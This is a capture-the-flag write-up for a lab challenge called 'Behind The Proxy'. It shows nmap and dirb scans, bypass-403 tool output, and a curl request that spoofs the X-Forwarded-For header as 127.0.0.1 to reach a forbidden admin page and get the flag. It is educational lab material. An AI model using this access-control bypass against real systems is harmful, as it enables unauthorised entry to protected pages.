# **Behind The Proxy - ThumderCipher**

*Target Ip. Address: 192.168.5.179*

Let's start with the nmap scan.

```bash
kali@kali:nmap -sV -sC 192.168.5.179
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-13 19:16 +0545
Nmap scan report for 192.168.5.179
Host is up (0.079s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 2e:6a:19:ef:86:e7:cd:78:d2:0e:e9:35:2c:e0:a2:d7 (ECDSA)
|_  256 0b:b1:5d:7e:81:8e:84:56:23:4e:fe:f7:d1:09:17:0b (ED25519)
80/tcp open  http    Apache httpd 2.4.63 ((Ubuntu))
|_http-title: Acme Solutions
|_http-server-header: Apache/2.4.63 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.26 seconds
```

So, we have 2 open ports. Port 22 (ssh) and Port 80 (http).

The website has nothing interesting, let's search for some hidden endpoints.

```bash
kali@kali:dirb http://192.168.5.179/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Feb 13 19:19:50 2026
URL_BASE: http://192.168.5.179/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.5.179/ ----
+ http://192.168.5.179/admin.php (CODE:200|SIZE:838)
```

So, we have admin.php. Let's check it out.

<img width="1287" height="948" alt="image" src="https://github.com/user-attachments/assets/cdb2c39c-a444-4740-b489-ebe7f1545ef2" />

We have a 403 Forbidden page. Let's see if we can bypass that, we will use bypass-403 tool.

```bash
kali@kali:./bypass-403.sh http://192.168.5.179/admin.php                                                                         
 ____                                  _  _    ___ _____ 
| __ ) _   _ _ __   __ _ ___ ___      | || |  / _ \___ / 
|  _ \| | | | '_ \ / _` / __/ __|_____| || |_| | | ||_ \ 
| |_) | |_| | |_) | (_| \__ \__ \_____|__   _| |_| |__) |
|____/ \__, | .__/ \__,_|___/___/        |_|  \___/____/ 
       |___/|_|                                          
                                               By Iam_J0ker
./bypass-403.sh https://example.com path
 
200,838  --> http://192.168.5.179/admin.php/
200,838  --> http://192.168.5.179/admin.php/%2e/
200,838  --> http://192.168.5.179/admin.php//.
200,838  --> http://192.168.5.179/admin.php////
200,838  --> http://192.168.5.179/admin.php/.//./
200,838  --> http://192.168.5.179/admin.php/ -H X-Original-URL: 
200,838  --> http://192.168.5.179/admin.php/ -H X-Custom-IP-Authorization: 127.0.0.1
200,908  --> http://192.168.5.179/admin.php/ -H X-Forwarded-For: 127.0.0.1
200,838  --> http://192.168.5.179/admin.php/ -H X-Forwarded-For: http://127.0.0.1
200,838  --> http://192.168.5.179/admin.php/ -H X-Forwarded-For: 127.0.0.1:80
200,838  --> http://192.168.5.179/admin.php -H X-rewrite-url: 
200,838  --> http://192.168.5.179/admin.php/%20
200,838  --> http://192.168.5.179/admin.php/%09
200,838  --> http://192.168.5.179/admin.php/?
200,838  --> http://192.168.5.179/admin.php/.html
200,838  --> http://192.168.5.179/admin.php//?anything
200,838  --> http://192.168.5.179/admin.php/#
200,838  --> http://192.168.5.179/admin.php/ -H Content-Length:0 -X POST
200,838  --> http://192.168.5.179/admin.php//*
200,838  --> http://192.168.5.179/admin.php/.php
200,838  --> http://192.168.5.179/admin.php/.json
405,301  --> http://192.168.5.179/admin.php/  -X TRACE
200,838  --> http://192.168.5.179/admin.php/ -H X-Host: 127.0.0.1
200,838  --> http://192.168.5.179/admin.php/..;/
000,0  --> http://192.168.5.179/admin.php/;/
405,301  --> http://192.168.5.179/admin.php/ -X TRACE
200,838  --> http://192.168.5.179/admin.php/ -H X-Forwarded-Host: 127.0.0.1
Way back machine:
jq: parse error: Invalid numeric literal at line 1, column 20
```

This is quite misleading, as every request return 200. So, we will try some manually.

```bash
kali@kali:curl -H "X-Forwarded-For: 127.0.0.1" http://192.168.5.179/admin.php                                                                                      
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>System Console</title>
    <style>
        body {
            font-family: monospace;
            background: #020617;
            color: #e5e7eb;
            padding-top: 120px;
            text-align: center;
        }
        .panel {
            width: 520px;
            margin: auto;
            background: #0f172a;
            padding: 30px;
            border-radius: 6px;
        }
        .error {
            color: #f87171;
        }
        .flag {
            color: #22c55e;
            font-size: 17px;
            margin-top: 15px;
            word-break: break-word;
        }
    </style>
</head>
<body>

<div class="panel">
    <h2>System Console</h2>
    <p>Internal access verified.</p>

    <div class="flag">
        ThunderCipher{pr.....on}
    </div>

</div>

</body>
</html>
```

The header "X-Forwarded-For: 127.0.0.1" worked and we successfully got the flag.
